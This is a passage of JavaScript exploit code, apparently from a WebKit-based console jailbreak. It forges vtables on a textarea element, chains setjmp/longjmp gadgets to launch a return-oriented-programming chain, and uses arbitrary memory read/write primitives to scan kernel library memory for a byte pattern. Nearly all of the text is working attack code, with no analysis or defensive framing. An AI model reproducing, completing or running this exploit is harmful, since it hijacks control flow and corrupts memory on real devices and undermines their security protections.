    var applyConfigs = function(vtable, configs) {
        var len = configs.length;
        var vtableRef = vtable; // Cache vtable reference
        for (var i = 0; i < len; i++) {
            var config = configs[i];
            p.write8(vtableRef.add32(config.offset), config.value);
        }
    };

    var setjmpConfigs = [
        {offset: 0x0, value: setjmpFakeVtable},
        {offset: 0xA8, value: webKitBase.add32(setJmpGadget_two)},
        {offset: 0x10, value: original_context},
        {offset: 0x8, value: libSceLibcInternalBase.add32(setJmpOffset)},
        {offset: 0x1D8, value: webKitBase.add32(setJmpGadget_one)}
    ];
    
    applyConfigs(setjmpFakeVtable, setjmpConfigs);

    var longjmpConfigs = [
        {offset: 0x0, value: longjmpFakeVtable},
        {offset: 0xA8, value: webKitBase.add32(longJmpGadget_two)},
        {offset: 0x10, value: modified_context},
        {offset: 0x8, value: libSceLibcInternalBase.add32(longJmpOffset)},
        {offset: 0x1D8, value: webKitBase.add32(longJmpGadget_one)}
    ];
    
    applyConfigs(longjmpFakeVtable, longjmpConfigs);

    var launch_chain = function (chain) {
        var gadgetsRef = cachedGadgets; // Use pre-cached gadgets
        var originalContextPtr = original_context;
        var modifiedContextPtr = modified_context;
        
        // Cache frequently used gadgets
        var popRdiRef = gadgetsRef["pop rdi"];
        var retRef = gadgetsRef["ret"];
        
        chain.push(popRdiRef);
        chain.push(originalContextPtr);
        chain.push(libSceLibcInternalBase.add32(longJmpOffset));

        pWrite8(textAreaVtPtr, setjmpFakeVtable);
        textArea.scrollLeft = 0;
        
        pWrite8(modifiedContextPtr.add32(0x00), retRef);
        pWrite8(modifiedContextPtr.add32(0x10), chain.stack);

        pWrite8(textAreaVtPtr, longjmpFakeVtable);
        textArea.scrollLeft = 0;
    }

    p.loadchain = launch_chain;

    var kview = new Uint8Array(0x1000);
    var kstr = p.leakval(kview).add32(0x10);
    var orig_kview_buf = p.read8(kstr);

    p.write8(kstr, window.libKernelBase);
    p.write4(kstr.add32(8), 0x40000);

    var countbytes;
    var pattern = [0x72, 0x64, 0x6c, 0x6f, 0x63];
    var patternLength = pattern.length;
    var maxIndex = 0x40000 - patternLength;
    var firstByte = pattern[0];
    
    // Optimized pattern matching with reduced comparisons
    for (var i = 0; i < maxIndex; i++) {
        if (kview[i] === firstByte) {
            var match = true;
            for (var j = 1; j < patternLength; j++) {
                if (kview[i + j] !== pattern[j]) {
                    match = false;
                    break;
                }
            }
            if (match) {
                countbytes = i;
                break;
            }
        }
    }
    
    p.write4(kstr.add32(8), countbytes + 32);

    var dview32 = new Uint32Array(1);
